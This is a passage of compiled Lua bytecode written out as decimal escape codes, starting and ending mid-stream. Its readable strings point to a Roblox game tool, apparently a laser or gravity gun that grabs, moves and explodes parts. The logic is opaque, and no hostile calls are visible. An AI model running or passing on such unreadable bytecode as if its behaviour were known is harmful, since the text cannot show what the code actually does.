0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\8\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\65\11\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\1\11\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\1\8\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\133\128\5\0\193\192\8\0\156\64\0\1\133\128\2\0\134\192\66\1\193\192\1\0\1\1\3\0\65\65\3\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\65\4\0\28\129\0\1\65\129\4\0\133\193\3\0\134\1\68\3\193\193\4\0\156\1\0\1\220\128\0\0\142\192\0\1\9\128\128\132\133\128\2\0\134\192\66\1\193\0\5\0\1\1\3\0\65\1\5\0\156\128\0\2\197\128\2\0\198\128\195\1\5\193\3\0\6\1\68\2\65\193\4\0\28\129\0\1\69\193\3\0\70\1\196\2\129\65\5\0\92\129\0\1\129\129\4\0\220\128\0\2\142\192\0\1\73\128\128\132\132\0\128\0\134\0\65\1\137\64\200\130\30\0\128\0\46\0\0\0\4\7\0\0\0\80\97\114\101\110\116\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\9\0\0\0\76\101\102\116\32\65\114\109\0\4\10\0\0\0\82\105\103\104\116\32\65\114\109\0\4\13\0\0\0\65\110\105\109\97\116\101\86\97\108\117\101\0\4\6\0\0\0\86\97\108\117\101\0\4\6\0\0\0\83\104\111\111\116\0\3\0\0\0\0\0\0\240\63\3\0\0\0\0\0\0\0\64\4\3\0\0\0\67\49\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\3\154\153\153\153\153\153\233\63\3\205\204\204\204\204\204\236\63\4\19\0\0\0\102\114\111\109\69\117\108\101\114\65\110\103\108\101\115\88\89\90\0\4\5\0\0\0\109\97\116\104\0\4\4\0\0\0\114\97\100\0\3\0\0\0\0\0\32\114\64\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\128\86\192\3\0\0\0\0\0\0\240\191\3\0\0\0\0\0\0\46\192\4\5\0\0\0\119\97\105\116\0\3\241\104\227\136\181\248\228\62\3\154\153\153\153\153\153\169\63\3\154\153\153\153\153\153\185\63\3\0\0\0\0\0\192\87\192\3\51\51\51\51\51\51\211\63\3\0\0\0\0\0\128\91\192\3\102\102\102\102\102\102\214\63\3\0\0\0\0\0\192\92\192\3\154\153\153\153\153\153\217\63\3\0\0\0\0\0\0\94\192\4\5\0\0\0\78\111\110\101\0\4\7\0\0\0\82\101\108\111\97\100\0\3\45\67\28\235\226\54\26\63\3\0\0\0\0\0\0\89\192\3\0\0\0\0\0\64\90\192\3\205\204\204\204\204\204\220\63\3\0\0\0\0\0\0\224\63\3\154\153\153\153\153\153\225\63\3\154\153\153\153\153\153\241\63\3\61\10\215\163\112\61\226\63\3\51\51\51\51\51\51\243\63\3\51\51\51\51\51\51\227\63\3\205\204\204\204\204\204\244\63\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\13\12\0\0\52\12\0\0\1\0\0\13\111\0\0\0\5\0\0\0\28\64\128\0\4\0\0\0\6\64\64\0\68\0\0\0\70\128\192\0\70\192\192\0\132\0\0\0\134\64\64\1\134\192\64\1\196\0\0\0\198\0\193\1\198\192\192\1\4\1\0\0\6\65\65\2\69\129\1\0\70\193\193\2\129\1\2\0\92\129\0\1\73\129\194\132\73\129\194\133\73\65\67\134\73\193\67\135\73\65\68\136\73\193\68\137\73\65\69\138\73\193\68\139\73\129\194\139\133\65\6\0\134\193\65\3\193\129\6\0\1\130\6\0\65\194\6\0\156\129\0\2\73\129\1\140\133\129\1\0\134\193\65\3\193\1\7\0\156\129\0\1\137\65\129\142\198\193\64\0\23\128\199\3\22\0\0\128\22\0\15\128\87\128\199\0\22\128\14\128\87\128\71\1\22\0\14\128\23\128\199\1\22\0\0\128\22\64\13\128\198\65\199\0\87\128\199\3\22\128\12\128\198\65\71\1\23\128\199\3\22\0\0\128\22\128\11\128\198\65\199\1\23\128\199\3\22\0\0\128\22\128\10\128\197\193\7\0\198\193\193\3\6\2\200\0\70\2\72\1\220\129\128\1\6\2\200\0\70\2\72\1\13\66\2\4\6\66\72\4\73\193\128\142\73\193\72\145\70\194\64\2\70\2\201\4\73\65\2\146\70\194\64\2\70\2\195\4\73\65\2\134\73\65\73\136\69\194\7\0\70\194\193\4\134\2\200\0\198\130\201\3\206\2\130\5\207\194\201\5\140\194\2\5\92\130\0\1\73\65\130\143\69\194\7\0\70\194\193\4\134\2\200\2\198\2\72\1\92\130\128\1\73\65\130\143\69\66\6\0\70\194\193\4\129\66\10\0\193\66\10\0\0\3\0\4\92\130\0\2\137\65\2\148\69\2\0\0\92\66\128\0\22\128\239\127\203\129\202\2\220\65\0\1\196\1\0\0\203\129\202\3\220\65\0\1\30\0\128\0\43\0\0\0\4\5\0\0\0\119\97\105\116\0\4\6\0\0\0\80\97\114\116\50\0\4\6\0\0\0\80\97\114\116\49\0\4\6\0\0\0\86\97\108\117\101\0\4\4\0\0\0\80\97\114\0\4\6\0\0\0\67\111\108\111\114\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\5\0\0\0\80\97\114\116\0\4\11\0\0\0\84\111\112\83\117\114\102\97\99\101\0\3\0\0\0\0\0\0\0\0\4\14\0\0\0\66\111\116\116\111\109\83\117\114\102\97\99\101\0\4\12\0\0\0\82\101\102\108\101\99\116\97\110\99\101\0\3\0\0\0\0\0\0\224\63\4\5\0\0\0\78\97\109\101\0\4\6\0\0\0\76\97\115\101\114\0\4\13\0\0\0\84\114\97\110\115\112\97\114\101\110\99\121\0\3\51\51\51\51\51\51\227\63\4\7\0\0\0\76\111\99\107\101\100\0\1\1\4\11\0\0\0\67\97\110\67\111\108\108\105\100\101\0\1\0\4\9\0\0\0\65\110\99\104\111\114\101\100\0\4\11\0\0\0\102\111\114\109\70\97\99\116\111\114\0\4\5\0\0\0\83\105\122\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\3\154\153\153\153\153\153\217\63\3\0\0\0\0\0\0\240\63\4\10\0\0\0\66\108\111\99\107\77\101\115\104\0\4\7\0\0\0\80\97\114\101\110\116\0\0\4\7\0\0\0\67\70\114\97\109\101\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\10\0\0\0\109\97\103\110\105\116\117\100\101\0\4\9\0\0\0\77\97\116\101\114\105\97\108\0\4\5\0\0\0\78\101\111\110\0\4\11\0\0\0\66\114\105\99\107\67\111\108\111\114\0\4\4\0\0\0\48\46\50\0\4\11\0\0\0\108\111\111\107\86\101\99\116\111\114\0\3\0\0\0\0\0\0\0\64\4\6\0\0\0\83\99\97\108\101\0\3\0\0\0\0\0\0\208\63\4\7\0\0\0\114\101\109\111\118\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\55\12\0\0\34\13\0\0\1\0\0\7\129\0\0\0\5\0\0\0\28\64\128\0\4\0\0\0\6\128\64\0\7\64\0\0\5\64\0\0\6\0\65\0\7\192\0\0\3\0\0\0\7\64\1\0\2\0\0\0\7\128\1\0\2\0\0\0\7\192\1\0\5\64\2\0\6\128\66\0\65\192\2\0\28\128\0\1\7\0\2\0\5\0\2\0\69\64\3\0\70\128\194\0\133\128\3\0\134\192\67\1\197\128\3\0\198\192\195\1\142\192\0\1\197\128\3\0\198\192\195\1\5\129\3\0\6\193\67\2\206\0\129\1\5\129\3\0\6\193\67\2\69\129\3\0\70\193\195\2\14\65\1\2\92\128\0\2\9\64\0\134\5\0\2\0\69\0\2\0\70\0\196\0\78\64\196\0\9\64\0\136\3\0\0\0\7\128\4\0\5\64\2\0\6\128\66\0\65\0\5\0\28\128\0\1\7\192\4\0\5\192\4\0\9\128\197\138\5\192\4\0\9\128\197\139\5\192\4\0\9\64\70\140\5\192\4\0\9\64\70\141\5\192\4\0\9\0\199\141\5\192\4\0\69\64\7\0\70\128\194\0\129\128\7\0\92\128\0\1\9\64\128\142\5\192\4\0\69\64\3\0\70\128\194\0\129\0\8\0\193\0\8\0\1\1\8\0\92\128\0\2\9\64\128\143\5\192\4\0\9\128\200\144\5\64\2\0\6\128\66\0\65\192\8\0\28\128\0\1\9\64\73\146\69\64\3\0\70\128\194\0\129\192\9\0\193\192\9\0\1\193\9\0\92\128\0\2\9\64\0\147\69\192\4\0\9\64\0\129\69\64\0\0\70\64\202\0\71\0\10\0\69\64\0\0\70\64\202\0\71\128\10\0\69\64\0\0\70\64\202\0\71\192\10\0\67\0\128\0\71\0\11\0\66\0\0\0\133\0\2\0\139\64\75\1\156\128\0\1\197\64\3\0\198\128\194\1\1\129\11\0\65\129\11\0\129\129\11\0\220\128\0\2\137\192\0\134\228\0\0\0\199\0\1\0\228\64\0\0\199\192\11\0\228\128\0\0\0\0\128\0\0\0\0\1\199\0\12\0\228\192\0\0\199\64\12\0\197\64\0\0\198\128\204\1\203\192\204\1\69\65\12\0\220\64\128\1\30\0\128\0\52\0\0\0\4\5\0\0\0\119\97\105\116\0\4\5\0\0\0\116\111\111\108\0\4\7\0\0\0\80\97\114\101\110\116\0\4\12\0\0\0\108\105\110\101\99\111\110\110\101\99\116\0\4\12\0\0\0\76\105\110\101\67\111\110\110\101\99\116\0\4\7\0\0\0\111\98\106\101\99\116\0\4\10\0\0\0\109\111\117\115\101\100\111\119\110\0\4\6\0\0\0\102\111\117\110\100\0\4\3\0\0\0\66\80\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\13\0\0\0\66\111\100\121\80\111\115\105\116\105\111\110\0\4\9\0\0\0\109\97\120\70\111\114\99\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\104\117\103\101\0\4\2\0\0\0\80\0\3\0\0\0\0\0\0\36\64\4\5\0\0\0\100\105\115\116\0\4\6\0\0\0\112\111\105\110\116\0\4\5\0\0\0\80\97\114\116\0\4\7\0\0\0\76\111\99\107\101\100\0\1\1\4\9\0\0\0\65\110\99\104\111\114\101\100\0\4\11\0\0\0\102\111\114\109\70\97\99\116\111\114\0\3\0\0\0\0\0\0\0\0\4\6\0\0\0\83\104\97\112\101\0\4\9\0\0\0\77\97\116\101\114\105\97\108\0\4\5\0\0\0\78\101\111\110\0\4\11\0\0\0\66\114\105\99\107\67\111\108\111\114\0\4\11\0\0\0\84\111\111\116\104\112\97\115\116\101\0\4\5\0\0\0\83\105\122\101\0\3\0\0\0\0\0\0\240\63\4\11\0\0\0\67\97\110\67\111\108\108\105\100\101\0\1\0\4\12\0\0\0\83\112\101\99\105\97\108\77\101\115\104\0\4\9\0\0\0\77\101\115\104\84\121\112\101\0\4\7\0\0\0\83\112\104\101\114\101\0\4\6\0\0\0\83\99\97\108\101\0\3\154\153\153\153\153\153\201\63\4\7\0\0\0\104\97\110\100\108\101\0\4\6\0\0\0\83\104\111\111\116\0\4\6\0\0\0\102\114\111\110\116\0\4\6\0\0\0\99\111\108\111\114\0\4\7\0\0\0\111\98\106\118\97\108\0\4\6\0\0\0\99\108\111\110\101\0\3\0\0\0\0\0\76\221\64\4\14\0\0\0\111\110\66\117\116\116\111\110\49\68\111\119\110\0\4\10\0\0\0\111\110\75\101\121\68\111\119\110\0\4\11\0\0\0\111\110\69\113\117\105\112\112\101\100\0\4\9\0\0\0\69\113\117\105\112\112\101\100\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\0\0\0\0\0\0\0\88\12\0\0\111\12\0\0\0\3\0\9\40\0\0\0\197\0\0\0\198\64\192\1\1\129\0\0\220\128\0\1\201\0\128\129\201\64\65\130\5\1\0\0\6\65\64\2\65\129\0\0\28\129\0\1\9\65\128\129\9\129\65\130\69\1\0\0\70\65\192\2\129\129\0\0\92\129\0\1\73\129\128\129\73\193\65\130\133\1\0\0\134\65\64\3\193\129\0\0\156\129\0\1\197\1\2\0\137\193\129\129\137\65\66\130\197\129\2\0\203\193\194\3\220\129\0\1\201\65\67\134\201\192\1\135\9\193\1\135\73\193\1\135\137\193\1\135\5\194\3\0\201\1\2\135\5\2\4\0\23\0\130\0\22\0\0\128\7\65\4\0\30\0\128\0\18\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\79\98\106\101\99\116\86\97\108\117\101\0\4\6\0\0\0\86\97\108\117\101\0\4\5\0\0\0\78\97\109\101\0\4\6\0\0\0\80\97\114\116\49\0\4\6\0\0\0\80\97\114\116\50\0\4\4\0\0\0\80\97\114\0\4\6\0\0\0\99\111\108\111\114\0\4\6\0\0\0\67\111\108\111\114\0\4\12\0\0\0\108\105\110\101\99\111\110\110\101\99\116\0\4\6\0\0\0\99\108\111\110\101\0\4\9\0\0\0\68\105\115\97\98\108\101\100\0\1\0\4\7\0\0\0\80\97\114\101\110\116\0\4\10\0\0\0\119\111\114\107\115\112\97\99\101\0\4\7\0\0\0\111\98\106\101\99\116\0\4\7\0\0\0\111\98\106\118\97\108\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\113\12\0\0\158\12\0\0\0\1\0\6\73\0\0\0\69\0\0\0\23\64\192\0\22\0\0\128\30\0\128\0\66\0\128\0\71\0\0\0\69\128\0\0\70\192\192\0\133\128\0\0\134\0\65\1\228\0\0\0\0\0\0\0\156\0\0\1\92\64\0\0\69\0\0\0\23\64\192\0\22\128\4\128\70\64\65\0\87\128\193\0\22\0\3\128\70\64\65\0\134\192\193\0\23\0\66\1\22\0\2\128\71\64\2\0\133\64\2\0\134\192\66\1\197\0\3\0\198\192\194\1\141\192\0\1\134\64\67\1\135\128\2\0\22\128\0\128\69\128\3\0\92\64\128\0\22\64\250\127\69\0\0\0\23\64\192\0\22\64\6\128\69\64\2\0\70\192\195\0\23\128\193\0\22\0\0\128\22\0\5\128\69\0\4\0\70\64\196\0\133\0\3\0\134\192\66\1\198\128\68\0\198\192\196\1\92\128\128\1\133\0\5\0\197\64\2\0\137\192\128\135\133\0\5\0\197\0\3\0\198\192\194\1\6\129\197\0\69\129\2\0\14\65\1\2\204\0\129\1\137\192\128\138\133\128\3\0\156\64\128\0\22\128\248\127\69\0\5\0\75\192\197\0\92\64\0\1\67\0\128\0\71\64\2\0\69\0\6\0\73\128\193\140\30\0\128\0\26\0\0\0\4\10\0\0\0\109\111\117\115\101\100\111\119\110\0\1\1\4\10\0\0\0\99\111\114\111\117\116\105\110\101\0\4\7\0\0\0\114\101\115\117\109\101\0\4\7\0\0\0\99\114\101\97\116\101\0\4\7\0\0\0\84\97\114\103\101\116\0\0\4\9\0\0\0\65\110\99\104\111\114\101\100\0\1\0\4\7\0\0\0\111\98\106\101\99\116\0\4\5\0\0\0\100\105\115\116\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\6\0\0\0\102\114\111\110\116\0\4\10\0\0\0\109\97\103\110\105\116\117\100\101\0\4\5\0\0\0\119\97\105\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\4\4\0\0\0\72\105\116\0\4\2\0\0\0\112\0\4\3\0\0\0\66\80\0\4\9\0\0\0\112\111\115\105\116\105\111\110\0\4\11\0\0\0\108\111\111\107\86\101\99\116\111\114\0\4\7\0\0\0\114\101\109\111\118\101\0\4\7\0\0\0\111\98\106\118\97\108\0\4\6\0\0\0\86\97\108\117\101\0\1\0\0\0\0\0\0\0\116\12\0\0\136\12\0\0\1\0\0\5\60\0\0\0\5\0\0\0\11\64\64\0\28\128\0\1\69\192\0\0\9\64\0\129\69\0\1\0\133\64\1\0\192\0\0\0\5\129\1\0\92\64\0\2\69\192\1\0\23\0\194\0\22\192\10\128\69\192\0\0\9\64\0\129\69\64\2\0\23\128\194\0\22\64\7\128\68\0\0\0\70\192\194\0\23\128\194\0\22\64\4\128\69\0\3\0\70\64\195\0\133\64\1\0\134\128\67\1\196\0\0\0\198\192\195\1\198\0\196\1\92\128\128\1\133\0\3\0\134\64\67\1\197\64\1\0\198\128\195\1\6\65\196\0\14\129\68\2\204\0\129\1\156\128\0\1\9\128\0\134\22\64\3\128\69\0\3\0\70\64\195\0\132\0\0\0\134\192\67\1\134\0\68\1\92\128\0\1\9\64\0\134\22\64\1\128\69\0\1\0\133\64\1\0\197\64\2\0\5\129\1\0\92\64\0\2\22\128\0\128\69\192\4\0\92\64\128\0\22\0\244\127\75\0\69\0\92\64\0\1\30\0\128\0\21\0\0\0\4\6\0\0\0\112\111\105\110\116\0\4\6\0\0\0\99\108\111\110\101\0\4\7\0\0\0\80\97\114\101\110\116\0\4\5\0\0\0\116\111\111\108\0\4\12\0\0\0\76\105\110\101\67\111\110\110\101\99\116\0\4\6\0\0\0\102\114\111\110\116\0\4\10\0\0\0\119\111\114\107\115\112\97\99\101\0\4\10\0\0\0\109\111\117\115\101\100\111\119\110\0\1\1\4\7\0\0\0\111\98\106\101\99\116\0\0\4\7\0\0\0\84\97\114\103\101\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\4\0\0\0\72\105\116\0\4\2\0\0\0\112\0\4\11\0\0\0\108\111\111\107\86\101\99\116\111\114\0\3\0\0\0\0\0\64\143\64\4\5\0\0\0\119\97\105\116\0\4\7\0\0\0\114\101\109\111\118\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\160\12\0\0\20\13\0\0\2\2\0\11\115\1\0\0\139\0\64\0\156\128\0\1\194\0\0\0\23\64\64\1\22\64\1\128\5\129\0\0\25\0\129\129\22\128\0\128\5\129\0\0\13\193\64\2\7\129\0\0\23\0\65\1\22\64\22\128\5\65\1\0\23\128\65\2\22\0\0\128\30\0\128\0\5\193\1\0\69\65\1\0\75\1\194\2\92\1\0\1\28\1\1\0\22\0\1\128\70\66\66\4\23\128\194\4\22\64\0\128\67\2\128\4\94\2\0\1\33\129\0\0\22\0\254\127\5\1\3\0\6\65\67\2\65\129\2\0\28\129\0\1\7\193\2\0\5\193\2\0\69\193\3\0\70\65\195\2\133\1\4\0\134\65\68\3\197\1\4\0\198\65\196\3\5\2\4\0\6\66\68\4\92\129\0\2\9\65\1\135\5\193\2\0\69\193\4\0\70\65\195\2\133\65\1\0\134\193\68\3\134\1\69\3\92\129\0\1\9\65\1\137\5\193\2\0\69\65\1\0\9\65\129\138\5\129\5\0\28\65\128\0\5\65\1\0\6\193\68\2\69\193\4\0\70\65\195\2\133\65\1\0\134\193\68\3\134\1\69\3\92\129\0\1\23\64\1\2\22\192\252\127\5\193\2\0\9\129\193\138\5\65\1\0\23\128\65\2\22\0\0\128\30\0\128\0\5\193\1\0\69\65\1\0\75\1\194\2\92\1\0\1\28\1\1\0\22\192\0\128\70\66\66\4\23\128\194\4\22\0\0\128\9\130\193\138\33\129\0\0\22\64\254\127\5\65\1\0\69\193\3\0\70\65\195\2\129\1\6\0\193\1\6\0\1\2\6\0\92\129\0\2\9\65\129\139\5\65\1\0\69\193\3\0\70\65\195\2\129\1\6\0\193\1\6\0\1\2\6\0\92\129\0\2\9\65\129\140\23\128\70\1\22\128\0\128\5\129\0\0\12\193\64\2\7\129\0\0\5\193\6\0\6\1\71\2\64\1\0\1\28\129\0\1\23\64\71\2\22\192\8\128\5\65\1\0\23\128\65\2\22\0\0\128\30\0\128\0\5\1\3\0\6\65\67\2\65\129\7\0\28\129\0\1\69\193\7\0\9\65\129\138\69\65\1\0\70\1\200\2\9\65\1\144\69\65\8\0\133\129\8\0\134\193\72\3\156\129\128\0\73\129\1\145\69\1\9\0\133\129\8\0\134\65\73\3\156\129\128\0\73\129\1\145\69\129\5\0\129\129\9\0\92\65\0\1\69\65\8\0\133\129\8\0\134\65\73\3\156\129\128\0\73\129\1\145\69\1\9\0\133\129\8\0\134\193\72\3\156\129\128\0\73\129\1\145\23\192\73\1\22\64\14\128\4\1\0\0\26\65\0\0\22\128\12\128\5\65\1\0\23\128\65\2\22\0\0\128\30\0\128\0\2\1\128\0\8\1\0\0\4\1\128\0\69\65\1\0\70\1\200\2\9\65\1\148\5\65\10\0\6\65\69\2\11\129\74\2\129\193\10\0\28\129\128\1\26\1\0\0\22\64\9\128\4\1\128\0\69\65\10\0\70\65\197\2\70\193\202\2\9\65\129\138\5\129\0\0\69\65\1\0\70\1\203\2\70\65\203\2\133\65\1\0\134\1\75\3\134\129\75\3\76\129\129\2\133\65\1\0\134\1\75\3\134\193\75\3\76\129\129\2\76\193\192\2\87\64\1\2\22\64\4\128\5\65\1\0\6\1\75\2\6\65\75\2\69\65\1\0\70\1\203\2\70\129\203\2\12\65\1\2\69\65\1\0\70\1\203\2\70\193\203\2\12\65\1\2\12\193\64\2\7\129\0\0\22\192\0\128\2\1\0\0\8\1\0\0\4\1\128\0\9\129\193\138\23\0\76\1\22\0\8\128\5\65\1\0\23\128\65\2\22\0\0\128\30\0\128\0\5\65\8\0\69\129\8\0\70\65\195\2\129\65\12\0\92\129\0\1\9\65\1\145\5\1\9\0\69\129\8\0\70\65\195\2\129\65\12\0\92\129\0\1\9\65\1\145\5\65\1\0\9\129\193\138\5\129\5\0\65\129\9\0\28\65\0\1\5\65\8\0\69\129\8\0\70\65\195\2\129\65\12\0\92\129\0\1\9\65\1\145\5\1\9\0\69\129\8\0\70\65\195\2\129\65\12\0\92\129\0\1\9\65\1\145\23\64\75\1\22\64\17\128\5\65\1\0\23\128\65\2\22\0\0\128\30\0\128\0\5\65\1\0\11\129\76\2\28\129\0\1\69\65\1\0\70\65\197\2\9\65\129\138\69\193\1\0\139\1\66\2\156\1\0\1\92\1\1\0\22\128\1\128\134\66\194\4\87\192\76\5\22\128\0\128\134\66\194\4\23\128\66\5\22\0\0\128\73\130\193\138\97\129\0\0\22\128\253\127\7\65\1\0\66\1\0\0\71\1\13\0\66\1\128\0\71\1\13\0\69\65\13\0\133\129\13\0\197\65\1\0\5\194\7\0\92\65\0\2\69\1\13\0\23\192\205\2\22\64\6\128\69\65\1\0\70\65\197\2\23\128\193\2\22\0\0\128\22\0\5\128\69\193\4\0\70\65\195\2\133\129\13\0\134\1\72\3\198\1\206\0\198\1\197\3\92\129\128\1\133\65\14\0\197\65\1\0\137\193\129\138\133\65\14\0\197\129\13\0\198\1\200\3\6\130\206\2\69\130\0\0\14\66\2\4\204\1\130\3\137\193\1\148\133\129\5\0\156\65\128\0\22\128\248\127\69\65\14\0\75\193\206\2\92\65\0\1\67\1\128\2\71\65\1\0\69\1\15\0\73\129\193\158\23\128\79\1\22\192\10\128\5\1\3\0\6\65\67\2\65\193\15\0\28\129\0\1\9\193\77\160\69\193\3\0\70\65\195\2\129\65\16\0\193\65\16\0\1\66\16\0\92\129\0\2\9\65\1\150\9\1\70\161\9\1\198\161\9\1\70\162\9\129\209\162\69\193\7\0\9\65\129\138\69\193\4\0\70\65\195\2\134\1\206\0\134\1\69\3\92\129\0\1\133\193\3\0\134\65\67\3\193\1\6\0\1\194\17\0\65\2\6\0\156\129\0\2\76\129\129\2\9\65\129\137\65\1\6\0\129\193\0\0\193\1\18\0\96\193\1\128\69\2\3\0\70\66\195\4\129\66\18\0\92\130\0\1\73\194\82\165\73\2\2\166\73\66\211\162\73\2\129\138\95\129\253\127\23\192\73\1\22\0\1\128\5\129\0\0\87\128\83\2\22\64\0\128\1\129\19\0\7\129\0\0\30\0\128\0\79\0\0\0\4\6\0\0\0\108\111\119\101\114\0\4\2\0\0\0\113\0\4\5\0\0\0\100\105\115\116\0\3\0\0\0\0\0\0\20\64\4\2\0\0\0\116\0\4\7\0\0\0\111\98\106\101\99\116\0\0\4\6\0\0\0\112\97\105\114\115\0\4\9\0\0\0\99\104\105\108\100\114\101\110\0\4\10\0\0\0\99\108\97\115\115\78\97\109\101\0\4\9\0\0\0\66\111\100\121\71\121\114\111\0\4\3\0\0\0\66\71\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\10\0\0\0\109\97\120\84\111\114\113\117\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\104\117\103\101\0\4\7\0\0\0\99\102\114\97\109\101\0\4\7\0\0\0\67\70\114\97\109\101\0\4\2\0\0\0\112\0\4\7\0\0\0\80\97\114\101\110\116\0\4\5\0\0\0\119\97\105\116\0\4\9\0\0\0\86\101\108\111\99\105\116\121\0\3\0\0\0\0\0\0\0\0\4\12\0\0\0\82\111\116\86\101\108\111\99\105\116\121\0\4\2\0\0\0\101\0\4\7\0\0\0\115\116\114\105\110\103\0\4\5\0\0\0\98\121\116\101\0\3\0\0\0\0\0\0\59\64\4\10\0\0\0\69\120\112\108\111\115\105\111\110\0\4\10\0\0\0\119\111\114\107\115\112\97\99\101\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\6\0\0\0\99\111\108\111\114\0\4\11\0\0\0\66\114\105\99\107\67\111\108\111\114\0\4\6\0\0\0\66\108\97\99\107\0\4\6\0\0\0\112\111\105\110\116\0\4\6\0\0\0\87\104\105\116\101\0\3\184\30\133\235\81\184\222\63\4\1\0\0\0\0\4\9\0\0\0\112\111\115\105\116\105\111\110\0\4\5\0\0\0\116\111\111\108\0\4\15\0\0\0\102\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\6\0\0\0\84\111\114\115\111\0\4\5\0\0\0\83\105\122\101\0\4\2\0\0\0\120\0\4\2\0\0\0\121\0\4\2\0\0\0\122\0\4\2\0\0\0\114\0\4\11\0\0\0\84\111\111\116\104\112\97\115\116\101\0\4\6\0\0\0\99\108\111\110\101\0\4\13\0\0\0\66\111\100\121\80\111\115\105\116\105\111\110\0\4\10\0\0\0\109\111\117\115\101\100\111\119\110\0\4\12\0\0\0\76\105\110\101\67\111\110\110\101\99\116\0\4\6\0\0\0\102\114\111\110\116\0\1\1\4\4\0\0\0\72\105\116\0\4\3\0\0\0\66\80\0\4\11\0\0\0\108\111\111\107\86\101\99\116\111\114\0\4\7\0\0\0\114\101\109\111\118\101\0\4\7\0\0\0\111\98\106\118\97\108\0\4\6\0\0\0\86\97\108\117\101\0\4\2\0\0\0\99\0\4\5\0\0\0\80\97\114\116\0\4\7\0\0\0\76\111\99\107\101\100\0\3\0\0\0\0\0\0\16\64\4\11\0\0\0\102\111\114\109\70\97\99\116\111\114\0\4\11\0\0\0\84\111\112\83\117\114\102\97\99\101\0\4\14\0\0\0\66\111\116\116\111\109\83\117\114\102\97\99\101\0\4\5\0\0\0\78\97\109\101\0\4\20\0\0\0\87\101\105\103\104\116\101\100\83\116\111\114\97\103\101\67\117\98\101\0\3\0\0\0\0\0\0\0\64\3\0\0\0\0\0\0\240\63\4\6\0\0\0\68\101\99\97\108\0\4\8\0\0\0\84\101\120\116\117\114\101\0\4\40\0\0\0\104\116\116\112\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\97\115\115\101\116\47\63\105\100\61\50\54\54\50\50\54\48\0\4\5\0\0\0\70\97\99\101\0\4\25\0\0\0\87\101\105\103\104\116\101\100\83\116\111\114\97\103\101\67\117\98\101\68\101\99\97\108\0\3\0\0\0\0\0\0\46\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\13\0\0\31\13\0\0\0\1\0\5\26\0\0\0\7\0\0\0\69\64\0\0\70\128\192\0\134\0\193\0\135\192\0\0\133\192\0\0\134\64\65\1\139\128\65\1\36\1\0\0\156\64\128\1\134\192\65\0\139\128\65\1\36\65\0\0\0\0\0\0\156\64\128\1\134\0\66\0\139\128\65\1\36\129\0\0\156\64\128\1\134\64\66\0\139\128\65\1\36\193\0\0\0\0\0\0\156\64\128\1\9\192\66\133\30\0\128\0\12\0\0\0\4\9\0\0\0\107\101\121\109\111\117\115\101\0\4\5\0\0\0\116\111\111\108\0\4\7\0\0\0\80\97\114\101\110\116\0\4\6\0\0\0\104\117\109\97\110\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\8\0\0\0\67\104\97\110\103\101\100\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\12\0\0\0\66\117\116\116\111\110\49\68\111\119\110\0\4\10\0\0\0\66\117\116\116\111\110\49\85\112\0\4\8\0\0\0\75\101\121\68\111\119\110\0\4\5\0\0\0\73\99\111\110\0\4\24\0\0\0\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\56\52\57\51\57\52\48\57\0\4\0\0\0\0\0\0\0\26\13\0\0\26\13\0\0\0\0\0\2\16\0\0\0\5\0\0\0\6\64\64\0\23\128\64\0\22\128\2\128\2\0\0\0\7\192\0\0\5\0\1\0\11\64\65\0\28\64\0\1\5\128\1\0\11\64\65\0\28\64\0\1\5\192\1\0\11\64\65\0\28\64\0\1\30\0\128\0\8\0\0\0\4\6\